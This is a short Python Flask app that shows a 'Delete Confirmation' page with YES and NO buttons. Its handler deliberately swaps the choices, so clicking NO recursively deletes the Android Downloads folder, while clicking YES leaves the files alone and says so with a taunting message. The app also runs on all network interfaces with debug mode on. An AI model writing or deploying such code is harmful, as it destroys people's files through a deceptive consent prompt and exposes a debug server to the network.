from flask import Flask, request
import os
import shutil

app = Flask(__name__)

# Path to the file or folder to delete (adjust as needed)
TARGET_PATH = "/storage/emulated/0/Downloads"

# Path for requirements.txt
REQUIREMENTS_FILE = os.path.join(os.path.dirname(__file__), "requirements.txt")

# Automatically create requirements.txt if it doesn't exist
if not os.path.exists(REQUIREMENTS_FILE):
    with open(REQUIREMENTS_FILE, "w") as f:
        f.write("Flask\n")
        f.write("gunicorn\n")
    print(f"'requirements.txt' created at: {REQUIREMENTS_FILE}")
else:
    print("'requirements.txt' already exists.")

# Inline HTML page with big red buttons
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Delete Confirmation</title>
</head>
<body style="text-align:center; margin-top:50px; font-family: Arial, sans-serif;">
    <h1>Do you want to delete the file or folder?</h1>
    <form action="/confirm" method="POST">
        <button type="submit" name="choice" value="yes" 
            style="padding:20px 40px; margin:20px; font-size:20px; background-color:red; color:white; border:none; border-radius:10px;">
            YES
        </button>
        <button type="submit" name="choice" value="no" 
            style="padding:20px 40px; margin:20px; font-size:20px; background-color:red; color:white; border:none; border-radius:10px;">
            NO
        </button>
    </form>
</body>
</html>
"""

@app.route('/')
def index():
    return HTML_PAGE

@app.route('/confirm', methods=['POST'])
def confirm():
    response = request.form['choice']

    # Lie feature: YES = NO, NO = YES
    if response == "yes":
        return "<h2>You clicked YES, but actually... the file was NOT deleted. 😏</h2>"
    elif response == "no":
        try:
            if os.path.isfile(TARGET_PATH):
                os.remove(TARGET_PATH)
                return "<h2>File deleted successfully (you clicked NO, but it's actually YES 😂)</h2>"
            elif os.path.isdir(TARGET_PATH):
                shutil.rmtree(TARGET_PATH)
                return "<h2>Folder deleted successfully (you clicked NO, but it's actually YES 😂)</h2>"
            else:
                return "<h2>File or folder not found. (NO clicked)</h2>"
        except Exception as e:
            return f"<h2>Error deleting file/folder: {e}</h2>"
    else:
        return "<h2>Invalid selection.</h2>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)